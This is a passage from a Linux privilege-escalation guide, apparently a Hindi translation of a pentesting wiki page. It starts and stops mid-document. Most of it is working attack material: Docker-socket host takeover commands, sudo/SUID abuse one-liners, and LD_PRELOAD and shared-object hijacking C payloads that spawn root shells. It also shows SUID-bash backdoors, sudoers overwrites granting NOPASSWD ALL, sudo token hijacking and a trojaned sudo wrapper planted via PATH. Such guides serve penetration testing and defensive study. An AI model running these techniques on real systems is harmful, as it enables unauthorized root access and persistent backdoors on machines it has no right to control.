- `Service`: यह निर्दिष्ट करता है कि **incoming traffic** पर किस **service** unit को **activate** करना है। यह setting केवल Accept=no वाले sockets के लिए अनुमति है। यह डिफ़ॉल्ट रूप से उस service को उपयोग करता है जिसका नाम socket के नाम से मिलता-जुलता होता है (suffix बदलकर)। अधिकांश मामलों में, इस option का उपयोग आवश्यक नहीं होना चाहिए।

### Writable `.socket` फ़ाइलें

यदि आपको कोई **लिखने योग्य** `.socket` फ़ाइल मिलती है तो आप `[Socket]` सेक्शन की शुरुआत में कुछ इस तरह जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनाए जाने से पहले executed हो जाएगा। इसलिए, आपको **शायद मशीन के reboot होने तक इंतज़ार करना होगा।**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

अगर आप कोई **लिखने योग्य socket** पहचानते हैं (_अब हम Unix Sockets की बात कर रहे हैं न कि config `.socket` फाइलों की_), तो आप उस socket के साथ **communicate** कर सकते हैं और संभवतः किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets की सूची
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_यह .socket files की बात नहीं है बल्कि उन फ़ाइलों की है जो unix sockets के रूप में कार्य करती हैं_). आप इसे निम्न से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद किसी **vulnerability** को **exploit** कर सकें।

### Writable Docker Socket

The Docker socket, अक्सर `/var/run/docker.sock` पर पाया जाता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित किया जाना चाहिए। डिफ़ॉल्ट रूप से, यह `root` user और `docker` group के सदस्यों द्वारा writable होता है। इस socket पर write access होना privilege escalation का कारण बन सकता है। यहाँ बताया गया है कि यह कैसे किया जा सकता है और वैकल्पिक तरीके अगर Docker CLI उपलब्ध न हो।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Using Docker API Directly**

In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.

### Others

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)। यदि {#ref}[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

docker से बाहर निकलने या इसे दुरुपयोग करके privileges बढ़ाने के और तरीके देखें:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप पाते हैं कि आप **`ctr`** command का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप पाते हैं कि आप **`runc`** command का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत inter-Process Communication (IPC) system है जो applications को प्रभावी ढंग से interact और data share करने में सक्षम बनाता है। यह आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया है और विभिन्न रूपों के application communication के लिए एक मजबूत फ़्रेमवर्क प्रदान करता है।

यह सिस्टम बहुमुखी है, बुनियादी IPC का समर्थन करता है जो processes के बीच data exchange को बढ़ाता है, और यह **enhanced UNIX domain sockets** की याद दिलाता है। इसके अलावा, यह events या signals के broadcasting में मदद करता है, जिससे system components के बीच seamless integration संभव होता है। उदाहरण के लिए, Bluetooth daemon का एक signal आने वाली कॉल के बारे में music player को mute करने का संकेत दे सकता है, जिससे user experience बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system का समर्थन करता है, जो applications के बीच service requests और method invocations को सरल बनाता है, उन प्रक्रियाओं को streamline करता है जो परंपरागत रूप से जटिल थीं।

D-Bus एक **allow/deny model** पर काम करता है, जो matching policy rules के समग्र प्रभाव के आधार पर message permissions (method calls, signal emissions, आदि) का प्रबंधन करता है। ये नीतियाँ bus के साथ interactions को निर्दिष्ट करती हैं, और इन permissions के दुरुपयोग के माध्यम से privilege escalation संभव हो सकता है।

ऐसी नीति का एक उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user को `fi.w1.wpa_supplicant1` के लिए own, send to, और receive संदेशों की permissions का विवरण देता है।

Policies जिनमें कोई user या group निर्दिष्ट नहीं है वे सार्वत्रिक रूप से लागू होती हैं, जबकि "default" context नीतियाँ उन सभी पर लागू होती हैं जो अन्य विशिष्ट नीतियों द्वारा कवर नहीं हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ सीखें कि कैसे एक D-Bus communication को enumerate और exploit किया जाता है:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

यह हमेशा दिलचस्प होता है नेटवर्क को enumerate करना और मशीन की स्थिति पता लगाना।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### खुले पोर्ट

हमेशा उन नेटवर्क सेवाओं की जाँच करें जो मशीन पर चल रही हों और जिनके साथ आप मशीन तक पहुँचने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँचें कि क्या आप ट्रैफ़िक sniff कर सकते हैं। अगर आप कर पाएँ, तो आप कुछ credentials हासिल कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जांचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकता है और किसके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो **UID > INT_MAX** वाले उपयोगकर्ताओं को अधिकार उन्नयन करने की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप किसी ऐसे समूह के **सदस्य** हैं जो आपको root अनुमतियाँ दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्लिपबोर्ड के अंदर कुछ दिलचस्प तो नहीं है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप वातावरण का कोई भी पासवर्ड **जानते हैं** तो उस पासवर्ड का उपयोग कर **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने की कोशिश करें**।

### Su Brute

यदि आप बहुत शोर करने की परवाह नहीं करते और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता पर brute-force आज़मा सकते हैं.\  
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख सकते हैं** तो आप संभवतः प्रिविलेज़ एस्केलेशन कर सकते हैं — उस writable फ़ोल्डर के अंदर किसी कमांड के नाम से एक **backdoor** बनाकर जिसे किसी अन्य उपयोगकर्ता (आदर्श रूप से root) द्वारा चलाया जाएगा और जो $PATH में आपके writable फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से **लोड नहीं होता**।

### SUDO and SUID

आपको कुछ कमांड `sudo` के माध्यम से चलाने की अनुमति हो सकती है या उन पर suid बिट सेट हो सकता है। इसे जांचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित कमांड आपको फ़ाइलें पढ़ने और/या लिखने या यहां तक कि कमांड निष्पादित करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को बिना पासवर्ड जाने किसी अन्य उपयोगकर्ता के अधिकारों के साथ कुछ कमांड चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है; अब root directory में एक ssh key जोड़कर या `sh` कॉल करके shell पाना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को कुछ निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **कमज़ोर** था **PYTHONPATH hijacking** के प्रति, जिससे script को root के रूप में चलाते समय एक मनमाना python library लोड की जा सकती थी:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep के माध्यम से संरक्षित → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash की non-interactive startup behavior का लाभ उठाकर किसी अनुमत कमांड को invoke करते समय arbitrary कोड root के रूप में चला सकते हैं।

- Why it works: non-interactive शेल्स के लिए, Bash `$BASH_ENV` का मूल्यांकन करती है और target script चलाने से पहले उस फ़ाइल को source करती है। कई sudo नियम किसी script या shell wrapper को चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फ़ाइल root privileges के साथ source होती है।

- आवश्यकताएँ:
- एक sudo rule जिसे आप चला सकते हैं (कोई भी target जो `/bin/bash` को non-interactively invoke करता है, या कोई भी bash script)।
- `BASH_ENV` `env_keep` में मौजूद हो (जांचें `sudo -l` के साथ)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- हार्डनिंग:
- Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
- sudo-allowed commands के लिए shell wrappers से बचें; न्यूनतम binaries का उपयोग करें।
- preserved env vars उपयोग होने पर sudo I/O logging और alerting पर विचार करें।

### Terraform sudo के माध्यम से preserved HOME के साथ (!env_reset)

यदि sudo environment को अछूता छोड़ता है (`!env_reset`) और साथ ही `terraform apply` की अनुमति देता है, तो `$HOME` कॉल करने वाले उपयोगकर्ता का बना रहता है। इसलिए Terraform root के रूप में **$HOME/.terraformrc** को लोड करता है और `provider_installation.dev_overrides` का सम्मान करता है।

- आवश्यक provider को एक writable directory की ओर इंगित करें और provider के नाम से एक malicious plugin रखें (उदा., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake में असफल रहेगा, लेकिन मरने से पहले `payload` को `root` के रूप में execute करेगा और पीछे एक `SUID shell` छोड़ देगा।

### TF_VAR overrides + symlink validation bypass

Terraform variables को `TF_VAR_<name>` environment variables के माध्यम से प्रदान किया जा सकता है, जो तब बच जाते हैं जब `sudo` environment को preserve करता है। कमजोर validations जैसे `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` को symlinks के साथ bypass किया जा सकता है:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink को resolve करके असली `/root/root.txt` को attacker-readable destination में copy कर देता है। उसी तरीके का इस्तेमाल privileged paths में पहले से destination symlinks बना कर **write** करने के लिए किया जा सकता है (उदा., provider’s destination path को `/etc/cron.d/` के अंदर point करना)।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

यदि `sudo -l` में `env_keep+=PATH` दिखता है या ऐसा `secure_path` है जिसमें attacker-writable entries (उदा., `/home/<user>/bin`) शामिल हों, तो sudo-allowed target के अंदर कोई भी relative command shadow किया जा सकता है।

- आवश्यकताएँ: ऐसा sudo rule (अक्सर `NOPASSWD`) जो एक script/binary चलाता हो जो commands को absolute paths के बिना कॉल करता हो (`free`, `df`, `ps`, आदि) और एक writable PATH entry जो पहले search की जाती हो।
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo निष्पादन बायपास करने वाले पथ
**कूदें** अन्य फ़ाइलें पढ़ने के लिए या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि **wildcard** का उपयोग किया गया है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**रोकथाम**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

यदि एकल कमांड को **sudo permission** **without specifying the path** दिया गया है: _hacker10 ALL= (root) less_ तो आप इसे PATH variable बदलकर exploit कर सकते हैं
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक उस स्थिति में भी उपयोग की जा सकती है जब एक **suid** binary बिना path बताए किसी अन्य command को execute करता है (हमेशा किसी अजीब SUID binary की सामग्री को _**strings**_ से चेक करें)।

[Payload examples to execute.](payloads-to-execute.md)

### SUID बाइनरी जिसमें command path हो

यदि **suid** binary **executes another command specifying the path**, तो आप उस command के नाम से **export a function** करने की कोशिश कर सकते हैं जिसे suid file कॉल कर रहा है।

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid बाइनरी को कॉल करेंगे, यह फ़ंक्शन चलाया जाएगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस फ़ीचर के दुरुपयोग को रोकने के लिए, विशेष रूप से **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- loader उन executables के लिए **LD_PRELOAD** को अनदेखा कर देता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल उन standard paths में मौजूद और जो भी suid/sgid हैं, वही libraries प्रीलोड की जाती हैं।

Privilege escalation हो सकता है अगर आपके पास `sudo` के साथ कमांड चलाने की क्षमता है और `sudo -l` के आउटपुट में **env_keep+=LD_PRELOAD** शामिल है। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को बनाए रहने और `sudo` के साथ कमांड चलाते समय भी मान्यता प्राप्त होने देता है, जो संभावित रूप से ऊंचे अधिकारों के साथ मनमाना कोड के निष्पादन की ओर ले जा सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** करने के लिए:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc दुरुपयोग किया जा सकता है यदि attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजे जाएंगे।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब आप किसी असामान्य दिखने वाले binary में **SUID** permissions पाते हैं, तो यह अच्छा अभ्यास है कि यह जाँचें कि क्या वह सही तरीके से **.so** files लोड कर रहा है। इसे निम्नलिखित कमांड चलाकर जाँचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर यह exploitation के लिए संभावित अवसर का संकेत देती है।

इसे exploit करने के लिए, आप एक C file बनाएँगे, मान लें _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार कंपाइल और एग्जीक्यूट किए जाने पर, फ़ाइल अनुमतियों में छेड़छाड़ करके और उच्च privileges के साथ shell को एग्जीक्यूट करके privileges बढ़ाने का प्रयास करता है।

ऊपर दिए गए C file को shared object (.so) फ़ाइल में कंपाइल करने के लिए:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने पर exploit ट्रिगर हो जाना चाहिए, जिससे संभावित system compromise की अनुमति मिल सकती है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो एक ऐसे folder से library लोड कर रहा है जिसमें हम लिख सकते हैं, तो उस folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस प्रकार की त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक curated सूची है Unix binaries की जिन्हें एक attacker द्वारा local security restrictions को bypass करने के लिए exploit किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) समान है लेकिन उन मामलों के लिए जहाँ आप केवल arguments inject कर सकते हैं किसी command में।

यह project Unix binaries के वैध functions को इकट्ठा करता है जिन्हें दुरुपयोग करके break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, और अन्य post-exploitation tasks को सुलभ किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह जाँचने के लिए कि यह किसी sudo नियम को exploit करने का तरीका ढूंढता है या नहीं।

### Sudo टोकन का पुनः उपयोग

ऐसे मामलों में जहाँ आपके पास sudo access है लेकिन password नहीं है, आप privileges escalate कर सकते हैं केवल sudo command के execution का इंतज़ार करके और फिर session token को hijack करके।

Privileges escalate करने की शर्तें:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने **`sudo`** का उपयोग करके पिछले 15 मिनटों में किसी चीज़ को execute किया हुआ होना चाहिए (डिफ़ॉल्ट रूप से यही sudo token की अवधि है जो हमें बिना किसी password के `sudo` उपयोग करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 होना चाहिए
- `gdb` उपलब्ध होना चाहिए (आप इसे अपलोड कर पाने में सक्षम होने चाहिए)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` के साथ सक्षम कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी शर्तें पूरी हैं, तो आप निम्न का उपयोग करके privileges escalate कर सकते हैं: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- The **second exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root owned और setuid के साथ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **sudoers file बनाएगा** जो **sudo tokens को अनंत बना देगा और सभी उपयोगकर्ताओं को sudo उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं.\\
उदाहरण के लिए, यदि आप _/var/run/sudo/ts/sampleuser_ फाइल को overwrite कर सकते हैं और आपके पास PID 1234 के साथ उस user के रूप में एक shell है, तो आप पासवर्ड जाने बिना **obtain sudo privileges** कर सकते हैं, ऐसा करते हुए:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह निर्धारित करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे।  
**डिफ़ॉल्ट रूप से ये फ़ाइलें केवल user root और group root द्वारा पढ़ी जा सकती हैं**.\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप **कुछ रोचक जानकारी प्राप्त** कर पाएंगे, और अगर आप किसी भी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** करने में सक्षम होंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD के लिए `doas` जैसे `sudo` binary के कुछ विकल्प हैं; इसकी कॉन्फ़िगरेशन को `/etc/doas.conf` पर जांचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आपको पता है कि एक **उपयोगकर्ता आमतौर पर किसी मशीन से कनेक्ट होकर `sudo` का उपयोग करके privileges escalate करता है** और आपने उसी उपयोगकर्ता संदर्भ में एक शेल हासिल कर ली है, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपके कोड को root के रूप में चलाएगा और फिर उपयोगकर्ता के कमांड को। फिर, **$PATH को संशोधित करें** (उदाहरण के लिए नया path `.bash_profile` में जोड़कर) ताकि जब उपयोगकर्ता sudo चलाए तो आपका sudo executable ही execute हो।

ध्यान दें कि यदि उपयोगकर्ता कोई अलग shell (bash नहीं) उपयोग करता है तो आपको नया path जोड़ने के लिए अन्य फाइलें संशोधित करनी पड़ेंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ इस तरह चलाना:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

